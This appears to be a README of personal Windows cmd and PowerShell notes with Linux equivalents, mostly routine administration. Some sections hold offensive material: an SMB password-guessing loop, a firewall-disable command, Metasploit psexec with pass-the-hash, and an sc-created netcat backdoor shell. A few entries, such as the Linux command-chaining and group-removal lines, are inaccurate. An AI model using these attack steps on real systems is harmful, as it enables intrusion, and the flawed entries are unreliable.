# Windows Command Line & Powershell Notes #
- [Command Line Utilities](./README.md#command-line-utilities)
- [One Liners](./README.md#one-liners)
- [Display Contents of Files](./README.md#display-contents-of-files)
- [Filter Command Output](./README.md#filter-command-output)
- [Enviromental Variables](./README.md#enviromental-variables)
- [Accounts and Groups](./README.md#accounts-and-groups)
- [Firewall](./README.md#firewall)
- [Registry](./README.md#registry)
- [SMB](./README.md#smb)
- [Services](./README.md#services)
- [Sleep](./README.md#sleep)
- [Chain Commands](./README.md#chain-commands)
- [Piping Stderr](./README.md#piping-stderr)
- [Echo Off](./README.md#echo-off)
- [Dev Null](./README.md#dev-null)
- [Newline Character](./README.md#newline-character)
- [For Loop (While)](./README.md#for-loop-while)
- [For Each Loop](./README.md#for-each-loop)
- [Batch File Vars](./README.md#batch-file-vars)
- [Command Line Args](./README.md#command-line-args)
- [Running Remote Commands (psexec)](./README.md#running-remote-commands-psexec)
- [Scheduling Jobs](./README.md#scheduling-jobs)
    - [at](./README.md#at-command)
    - [schtasks](./README.md#schtasks-command)
    - [sc](./README.md#sc-command)
    - [wmic](./README.md#wmic-command)
- [PowerShell](./README.md#powershell)
    - [Alias](./README.md#alias)
    - [Help](./README.md#help)
    - [Whatif](./README.md#whatif)
    - [Piping](./README.md#piping)
    - [For Each](./README.md#for-each)
    - [Where (filter by property)](./README.md#where-filter-by-property)
    - [Select String (cat+grep)](./README.md#select-filter-by-property---create-obj)
    - [Count](./README.md#count)
    - [Variables](./README.md#variables)
    - [Concatenate](./README.md#concatenate)
    - [Out-Host (obj to str)](./README.md#out-host-obj-to-str)
    - [Write to File](./README.md#write-to-file)
    - [Operators](./README.md#operators)

_Linux, Bash, & Python examples for comparison._

***




### Command Line Utilities ###
List current TCP/UDP port usage.
```
Windows:    netstat -na
Linux:      netstat -tuplen
```

Get status of listening port continously
```
Windows:    netstat -nao 1 | find ":[port]"
Linux:      netstat -tuplen -c | grep ":[port]"
```

Shows arp cache. Entries are the systems which the host has sent packets to in the last 10 minutes.
```
Windows:    arp -a
Linux:      arp -a
```

Shows routing tables.
```
Windows:    netstat -nr
Linux:      netstat -nr
Linux:      ip route
Linux:      route -n
```

Shows recently resolved domain names. Is there a linux equivalent?? would love to know!!
```
Windows:    ipconfig /displaydns
```

What user am I logged in as? Windows command only works on cmd.exe not powershell. Windows also does not include the python-pwd module. _see Enviromental Variables_. 
```
Linux:      whoami
Windows:    set username
python:     pwd.getpwuid(os.getuid())[0]
python:     getpass.getuser()
python:     os.environ.get('USERNAME')
```

Display current users path. _see Enviromental Variables_. 
```
Linux:      printenv PATH
SH/Bash:    echo $PATH
Windows:    set path
python:     os.environ.get('PATH')
```

---

### One Liners ###
List all installed software/packages.
```
Windows:        dir /s "C:\Program Files"
Linux (apt):    apt list --installed
Linux (yum):    yum list installed
```

Ping Sweep a `/24` network.
```
Windows:    for /L  %i in (1,1,255) do @ping -n 1 192.168.1.%i | find "TTL"

Linux:      i=1; while [ $i -le 255 ]; do ping -c 1 192.168.1.$i | grep ttl; i=$(( $i + 1 )); done;

Bash:       i=1
            while [ $i -le 255 ]
            do
                ping -c1 192.168.1.$i | grep ttl
                i=$(( $i + 1 ))
            done
```

Read through a file containing a list of passwords and attempt to initialize an SMB session while trying each password.
```
Windows:    for /f %i in ([path/to/file]) do @echo %i & @net use \\[remote_ip] %i /u:[username] 2>nul && pause
```

---

### Display Contents of Files ###
Display the contents of a file, equivalent to linux `cat`.
```
Windows:    type [path/to/file]
Linux:      cat [path/to/file]
```

Display the contents of multiple files using a wildcard in the filename.
```
Windows:    type *.[file extension]    ie:  type *.txt
Linux:      cat *.[file extension]
```

Dispaly the contents of multiple files by passing multiple arguments (file names/paths) to the command.
```
Windows:    type [path/to/File-A] [path/to/File-B]
Linux:      cat [path/to/File-A] [path/to/File-B]
```

Display only a snipet of a file with the option to scroll through the remaining contents.
```
Windows:    more [path/to/file]
Linux:      more [path/to/file]
```

Display only the lines from a file which contain a certain string. Windows command only works on cmd.exe not powershell, is there a equivalent command for powershell (_see next_)?
```
Windows:    type [path/to/file] | find /i "[string]"
Linux:      cat [path/to/file] | grep "[string]"
```

Display only the lines from a file which contain a certain regex. Windows command works in powershell.
```
Windows:    type [path/to/file] | findstr "[regex]"
Linux:      cat [path/to/file] | grep "[regex]"
```

Display contents of a file continuously, will update if new lines are written to it. Is there a equivalent Windows command? Linux Only, had to note it because its so awesome.
```
Linux:      tail -f [path/to/file]
```

---

### Filter Command Output ###
Filter the output of a command, show results only if `string` is containted in the output.
```
Windows:    @[command] | find "[string]"
Linux:      [command] | grep "[string]"
```


---

### Enviromental Variables ###
Display all enviromental variables
```
Windows:    set
Linux:      set
Linux:      env
Linux:      printenv
python:     print os.environ     <--- returns dict
PowerShell: ls env:
```

Display a specific enviromental variable such as `username` or `path`.
```
Windows:    set [env_key]
Linux:      printenv [env_key]
python:     print os.environ.get("[env_key]")
SH/Bash:    echo $[env_key]
PowerShell: echo $env:[env_key]
```


Set a enviromental variable; not persistent.
```
Windows:    set [env_key]=[env_value]
Linux:      env [env_key]=[env_value]
Linux:      export [env_key]=[env_value]
python:     os.environ[env_key]=[env_value]
SH/Bash:    [env_key]=[env_value]
```

---

### Accounts and Groups ###
List all local users on a system.
```
Windows:    net user
Linux:      cat /etc/passwd
Linux:      cut -d: -f1 /etc/passwd
```

List all local groups on a system.
```
Windows:    net localgroup
Linux:      cat /etc/group
Linux:      cut -d: -f1 /etc/group
```

List all members of a group. Linux doesn't have great options.
```
Windows:    net localgroup [group_name]
Linux:      getent group [group_name]
```

Create user and set password.
```
Windows:    net user [username] [passwd] /add
Linux:      adduser [username]
             passwd [username]
```

Add user to group.
```
Windows:    net localgroup [group_name] [username] /add
Linux:      usermod -aG [group_name] [username]
```

Remove user.
```
Windows:    net user [username] /del
Linux:      userdel [username]
```

Remove user from group.
```
Windows:    net localgroup [group_name] [username] /del
Linux:      userdel [username] [group_name]
Linux:      gpasswd -d [username] [group_name]
```

---

### Firewall ###
Show all firewall rules for all profiles.
```
Windows:    netsh advfirewall show allprofiles
Linux:      iptables -t filter -L
Linux:      firewall-cmd --list-ports
Linux:      firewall-cmd --list-services
```

Add firewall rule to allow inbound connection.
```
Windows:    netsh advfirewall firewall add rule name="[rule_name]" dir=in action=allow remoteip=[?optional?] protocol=TCP localport=[port]

Linux:      iptables -A INPUT -p tcp --dport [port] -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
            iptables -A OUTPUT -p tcp --sport [port] -m conntrack --ctstate ESTABLISHED -j ACCEPT

Linux:      firewall-cmd --zone=[public] --add-port=[port]/tcp    (--permanent)
            firewall-cmd --zone=[public] --add-service=[service_name]     (--permanent)
            firewall-cmd --reload
```


Remove firewall rules.
```
Windows:    netsh advfirewall firewall del rule name="[rule_name]"

Linux:      iptables -D INPUT -p tcp --dport [port] -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
            iptables -D OUTPUT -p tcp --sport [port] -m conntrack --ctstate ESTABLISHED -j ACCEPT

Linux:      firewall-cmd --zone=[public] --remove-port=[port]/tcp    (--permanent)
            firewall-cmd --zone=[public] --remove-service=[service_name]     (--permanent)
            firewall-cmd --reload
```

Disable firewall.
```
Windows:    netsh advfirewall set allprofiles state off
```

---

### Registry ###
Search registry by key.
```
reg query [key_name]
```

Create and/or Modify registry key/values by key.
```
reg add [key_name] /v [key_value] /t [type] /d [data]
```

Export registry settings to files.
```
reg export [key_name] [path/to/file.reg]
```

Import to registry.
```
reg import [path/to/file.reg]
```

Remotely interact with another systems registry over SMB.
```
reg query \\[remote_system] [key_name]
reg add \\[remote_system] [key_name] /v [key_value] /t [type] /d [data]
reg export \\[remote_system] [key_name] [path/to/file.reg]
reg import \\[remote_system] [path/to/file.reg]
```

---

### SMB ###
Note: only one SMB session permitted to the same remote system at a time.
Initialize SMB session.
```
net use \\[remote_ip] [password] /u:[username]
```

Mount share over SMB.
```
net use * \\[remote_ip]\[share] [password] /u:[username]
```

Drop SMB session.
```
net use \\[remote_ip] /del
```

Drop all SMB session.
```
net use * /del /y
```

---

### Services ###
Run against a remote system by adding `sc \\[remote_ip]` before all commands; over SMB session.
```
Windows:    sc \\[remote_ip] query
Windows:    sc \\[remote_ip] query state=all
Windows:    sc \\[remote_ip] qc [service_name]
```

List _ALL_ services.
```
Windows:    sc query state=all
Linux:      ps -A
Linux:      systemctl list-unit-files
```

List all running services.
```
Windows:    sc query
Linux:      ps aux | less
```

Get service status.
```
Windows:    sc qc [service_name]
Linux:      systemctl status [service_name]
```

Start status.
```
Windows:    sc start [service_name]
Linux:      systemctl start [service_name]
```

Enable status.
```
Windows:    sc config [service_name] start=demand
Linux:      systemctl enable [service_name]
```

Stop status.
```
Windows:    sc stop [service_name]
Linux:      systemctl stop [service_name]
```

---

### Sleep ###
The `/t` specifies number of seconds to wait.
```
Windows:    timeout /t 4
Linux:      sleep 4
Python:     time.sleep(4)
```

Prevent stop (`CTL+C`) with `/nobreak`.
```
Windows:    timeout /t 4 /nobreak
```

---

### Chain Commands ###
Run second command always, even if the first command fails.
```
Windows:    [first_command] & [second_command]
Linux:      [first_command] || [second_command]
```
Run second command only if first command succeeds.
```
Windows:    [first_command] && [second_command]
Linux:      [first_command] && [second_command]
```

---

### Piping Stderr ###
Redirect Stderr to Stdout, then write to file.
```
Windows:    [command] 2>> error.log
Linux:      [command] >> error.log 2>&1
```
Bash notes: https://www.tldp.org/LDP/abs/html/io-redirection.html

---

### Echo Off ###
Do not display `echo` stdout.
```
Windows:    @echo [string]
```
Why would you want to do that? Why not just remove the `echo` statement?

---

### Dev Null ###
```
Windows:    echo "Hello World" > nul
Linux:      echo "Hello World" >> /dev/null
PowerShell: echo "Hello World" 2> $null    <--stderr
PowerShell: echo "Hello World" | out-null  <--stdout
```

---

### Newline Character ###
Print a newline character.
```
Windows:    echo.
Linux:      echo "\n"
PowerShell: "`n"
```

---

### For Loop (While) ###
`FOR /L` = More like a while loop with an incremented variable...
Construction: `for /L %i ([start],[increment],[stop]) do [command]`
Exmaples:
```
Windows:    for /L %i in (1,1,255) do echo %i

Python:     i=1
            while i < 255:
                  print i
                  i+=1

Bash:       i=1
            while [ $i -le 255 ]
            do
                echo $i
                i=$(( $i + 1 ))
            done
```

---

### For Each Loop ###
`FOR /F` = For each loop
Construction: `for /F [options] %i in ([data]) do [command]`
Exmaples:
```
Windows:    for /F %i in ([data]) do echo %i

Python:     for i in [data]:
                print i

Bash:       for i in [data]
                 echo %i
            done
```

---

### Batch File Vars ###
Temporary variables such as `%i` must be written as `%%i` if running from a `.bat` file. This is because command like args are represented as `%1`,`%2`,`%3` ect.
```
Windows:    for /F %%i in ([data]) do echo %%i
```
https://stackoverflow.com/questions/14509652/what-is-the-difference-between-and-in-a-cmd-file

---

### Command Line Args ###
Parameters passed to a script from the commandline can be retrieved within the script by invoking special variables.
```
Windows:    example.bat [arg]
            echo %1

Python:     example.py [arg]
            print sys.argv[1]

Bash:       example.sh [arg]
            echo $1
```

---

### Running Remote Commands (psexec) ###
To run commands against a remote system leverage `psexec`, not included in Windows by default it is apart of [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/). 

Features:
- Requires SMB session
- Run as local `SYSTEM` privileges  with `-s` flag.
- Run as specific user `-u [username] -p [password]`.
- Daemonize with `-d` flag; detache and runs in background.
- Copy program to remove system with `-c`.
- By not specifying a user to run as it will default to the current user.

```
C:\> psexec \\[remote_ip] -u [username] -p [password] [command]
C:\> psexec \\[remote_ip] -d -s [command]
C:\> psexec \\[remote_ip] -c [command]
```

Metasploits version of `psexec` supports _pass-the-hash_ capabilities.
```
msf > use exploit/windows/smb/psexec
msf > set PAYLOAD [payload]
msf > set RHOST [remote_ip]
msf > SMBUser [username]
msf > SMBPass [password]
    or
msf > SMBPass [hash]
```

Note: Pivoting via `psexec` minimizes unintended crashes etc.

**Other methods of running remote commands involve task scheduling, see next.**

---

### Scheduling Jobs ###
In Windows, task scheduling is one of the _"most common methods"_ to run remote commands ... probably because the lack of naitive SSH *cough cough*. The advantage of this method over `psexec` is that all executables are included by default in the operating system.

*Pre-requisits:*
- SMB session required `net use \\[remote_ip] /u:[username] [password]`
- Verify "Schedule" service is running `sc \\[remote_ip] query schedule`
- Start "Schedule" service if not already running `sc \\[remote_ip] start schedule`
- Verify  sstem time of remote system is correct`net time \\[remote_ip]`
 
 
#### `at` command ####
Only able to run as local `SYSTEM` user.
Some Windows operating systems support the 24HR time format.
```
C:\> at \\[remote_ip] [HH:MM][A|P] [command]
```
Verify job has started with the command `at \\[remote_ip]`.
 
 
#### `schtasks` command ####
Only able to run as any user.

Some Windows operating systems support the 24HR time format.

Start Time must be in `HH:MM:SS` format.

Start Date must be in `MM/DD/YYYY` format?

Frequency must one of the following `MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE`.

Task Name is important so we can `sc query` it for status.
```
C:\> schtasks /create /tn [taskname] /s [remote_ip] /u [username] /p [password] /sc [frequency] /st [start_time] /sd [start_date] /tr [command]
```
Verify job has started with the command `schtasks /query /s [remote_ip]`.

Meterpreter includes a module called `schtasksabuse` that simplifies a lot of the `schtasks` process. If no credentials are given, `schtasksabuse` will run as the user who owns the process that _hosts_ meterpreter.
```
meterpreter > run schtasksabuse -c "[command_1],[command_2]" -t [remote_ip] -u [username] -p [password]
```
 
 
#### `sc` command ####
Starts the command as a service. _see limitation notes below_.
The space between `binpath= ` and the `[command]` is intentional and is required syntax. Wtf?
```
C:\> sc \\[remote_ip] create [service_name] binpath= "[command] [-flag] [arg]"
```
Next we will have to start the process with `sc \\[remote_ip] start [service_name]`, skip this step by adding `start= auto` when creating the service.

A (severe) limitation is that the service will only live for 30 seconds, this is because the service doesn't callback to `sc` letting it know that the service started; wtb `exit 0`. 
Working around this can be done by the following:
- (hack) Use `sc` to start a `cmd.exe` which then invokes another command, whatever we spawn will outlive the 30 second window.
- (bad)  Use a program to wrap an executable so that it throws the API call indicating a successful service start. See (ServifyThis)[https://github.com/inguardians/ServifyThis].

An example of the former:
```
C:\> sc \\[remote_ip] create netcat binpath= "cmd.exe /k c:\path\to\nc.exe -L -p 4444 -e cmd.exe" start= auto
```
This creates a service called `netcat` which starts `cmd.exe /k` to run another command which is `nc.exe`; That'll listens on port 4444 and when it detects an inbound connection it'll `-e` execute `cmd.exe` back through the netcat session. This is a common backdoor shell, see (netcat-utils)[https://github.com/cjwaian/netcat-utils]. 

Remove service with `sc \\[remote_ip] delete [service_name].

 
 
#### `wmic` command ####
The Windows Management Instrumentation (WMI) framework.
Does not require a SMB session?
By default it will run on a local system but by invoking `/node:[remote_ip]` it will execute on a remote system. 
Specify credentials with `/user:[username] /password:[password]`.
If no credentials are provided WMIC will pass throught the existing user credentials for authenticating to that remote system, _pass-the-hash_?
To run against multiple remote systems, first create a `.txt` file with the machine name or IP Adrress on each line, then use `/node:@[filename.txt]`. WMIC will iterate through the file executing on each remote system.
```
C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process call create [command]
```

List processes on a remote system.
```
C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process list brief
```

Kill a process by `PID`
```
C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process where processid="[PID]" delete
```

Kill process by `service_name`.
```
C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process where name="[service_name]" delete
```

Monitor process status continuously.
```
C:\> wmic process where name="[service name]" list brief /every:1
```

It is important to damonize any process that pop-up's `cmd.exe` in order to hide the GUI window.

Terminate a running process on a system locally with `taskkill /PID [PID]`.

---

### PowerShell ###
Founational commands are called `cmdlets` they use `verb-noun` naming convention. Large number of cmdlets available but there aren't that many verbs so when looking for a command start with the verb portion. PowerShell permits <kbd>TAB</kbd> completetion, <kbd>SHIFT+TAB</kbd> takes you back one assumtion.

List all cmdlets: `get-command`

List all "set" verb cmdlets: `get-command set*`

List all "process" noun cmdlets: `get-command *process`

List all object properties: `[object] | Select-Object -Property *`

#### Alias ####
Alias can be used to shorten the verbose verb-noun format into something actually useable/readable ...

List all alias: `alias`

Find alias for cmd-let: `get-alias -Definition [cmdlet]`

Alias  | Cmdlet
------------- | -------------
ls, dir, gci  | Get-ChildItem
cp, copy, cpi  | Copy-Item
mv, move, mi  | Move-Item
sls (grep, find, findstr)  | Select-String
man, help  | Get-Help
cat, type, gc | Get-Content
ps, gps  | Get-Process
pwd, gl  | Get-Location

#### Help ####
Cmdlet `Get-Help` is aliased to `help`.
```
PS C:\> help [cmdlet/alias]
PS C:\> help [cmdlet/alias] -detail
PS C:\> help [cmdlet/alias] -examples
PS C:\> help [cmdlet/alias] -full
```

#### Whatif ####
Most cmdlets support the `-whatif` flag which previews an operation without actually doing it.
```
PS C:\> Remove-Item example.txt -whatif
What if: Performing the operation "Remove File" on target "example.txt".
```

#### Piping ####
When piping objects are passed through the pipe not Stdout.

For example `ls | ls` would list all file in the current working directory (`ls ./`) and then pass the list to another `ls` cmd which lists all files inside of that sub-directory (`ls [subdir]`).

Here is another example trying to replicate linux's `ls -la`, apparently file attributes don't include owner ...
```
PS C:\> ls | format-list -property Attributes, Mode, Name, LastAccessTime
Attributes : ReadOnly, Directory
Mode       : d-r---
Name       : ExampleDirectory
```
Object attributes can be directly accessed using dot notation.
```
PS C:\> ls | % {$_.Attributes; $_.Mode; $_.Name; $_.LastAccessTime; "`n";}
ReadOnly, Directory
d-r---
ExampleDirectory
Thursday, February 1, 2018 10:53:58 AM
 ```

#### For Each ####
`ForEach-Object` is the cmdlet for For Loops, aliased to `%`, it is a contained iterator for whatever set of data you pass to it
```
PS C:\> [cmdlet/data] | % {[cmdlet] $_}
PS C:\> [cmdlet_1/data] | % {[cmdlet_2] $_; [cmdlet_3] $_;}
```
Local temporary variables used for the current object are represented as `$_`, equivalent to Javascripts `this`.

The curly braces `{}` represent a code block and must be used to encapsulate the inside of the loop..

Semi-colon `;` represent the end of a statement, this allows for multiple statements inside a loop; similar to bash.

Nesting Pipes Examples:
```
PS C:\> ls | % {$_ | ? {$_.Attributes -eq "Directory"}}
```
To iterate over a range, use `1..100` notation, similar to pythons `range(1,100)`.
```
PS C:\> 1..100 | % {echo $_}
```

#### Where (filter by property) ####
Filter a set of objects by their property using the `Where-Object` aliased to `?`.

Examples:
```
PS C:\> get-service | ? {$_.status -eq "running"}
PS C:\> ls -Recurse | ? {$_.Name -eq "Users"}
```

#### Select (filter by property - create obj) ####
Another way to filter cmdlet output is to create new object only with the properties we are interested in.
```
PS C:\> ls | select Attributes,Mode,Name,LastAccessTime
ReadOnly, Directory d-r--- ExampleDirectory       2/1/2018 10:53:58 AM
```

#### Select String (cat+grep) ####
Read a file and search for a specific string with `Select-String` aliased to `sls`. Similar to combining `cat [filename] | grep [pattern]` into one command.
```
PS C:\> select-string -path C:\path\to\files\*.txt -pattern [pattern]
```

Using what we have already learned, to build a command to recursively search through a directory scanning each file for a pattern, similar to 'grep -r "[pattern]" .`
```
PS C:\> ls -r C:\path\to\dir | % {sls -path $_ -pattern [pattern]} 2>$null
```

#### Count ####
Count using `([data]).count`. This example will iterate through a directory and count the number of files inside the subdirectories.
```
PS C:\> ls | % {echo $_.Name; (ls $_).count; "`n";}
```

#### Variables ####
Contruct variables like so, `$var=[data]`; access them with `$var`.

#### Concatenate ####
Concatenate variables by wrappinging in `$()` such as `$($(var1) $(var2))`. Another method is similar to pythons `%s` notation, `"{0} {1}" -f $var1,$var2`.
```
PS C:\> $hello="Hello"
PS C:\> $world="World"

PS C:\> echo ("{0} {1}!" -f $hello,$world)
Hello World!

PS C:\> echo $("$($hello) $($world)!")
Hello World!

PS C:\> ls | % {echo "$($_.Name) $((ls $_).count) `n";}

PS C:\> ls | % {echo ("{0} {1} `n" -f $_.Name,(ls $_).count);}
```

#### Out-Host (obj to str) ####
Convert objects to string using the `Out-Host` cmdlet, aliased to `oh`. Add pagination with `-paging`.
```
PS C:\> ls -r | Out-Host -paging
```


#### Write to File ####
Write objects/strings to file with the `Out-File` cmdlet. no alias.
```
PS C:\> ls | Out-File C:\path\to\file.txt
```

#### Operators ####
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-6

Op  |  Description
--- | ---------------
-eq | equals
-ne | not equals
-gt | greater than
-ge | greater than or equal
-lt | less than
-le | less than or equal
-like | Returns true when string matches wildcard pattern
-notlike | Returns true when string does not match wildcard pattern
-match | Returns true when string matches regex pattern; $matches contains matching strings
-notmatch | Returns true when string does not match regex pattern; $matches contains matching strings
-contains | Returns true when reference value contained in a collection
-notcontains | Returns true when reference value not contained in a collection
-in | Returns true when test value contained in a collection
-notin | Returns true when test value not contained in a collection
-replace | Replaces a string pattern 
-is | Returns true if both object are the same type
-isnot | Returns true if the objects are not the same type
